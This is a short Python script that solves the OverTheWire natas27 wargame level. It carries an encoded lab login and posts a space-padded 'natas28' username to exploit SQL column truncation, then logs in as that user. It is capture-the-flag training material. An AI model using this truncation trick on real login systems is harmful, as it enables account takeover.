import requests

url ="http://natas27.natas.labs.overthewire.org/index.php"

headers = {
	"Authorization": "Basic bmF0YXMyNzo1NVRCanBQWlVVSmdWUDViM0JuYkc2T045dURQVnpDSg=="
}

#for i range(1,50):
data = {
	#"username":"natas28"
	"username":"natas28                                                         hackyu",
	"password":""
}

res =requests.post(url, headers=headers, data=data)

print res.content

data = {
	"username":"natas28",
	"password":""
}

res = requests.post(url,headers=headers,data=data)
print res.content
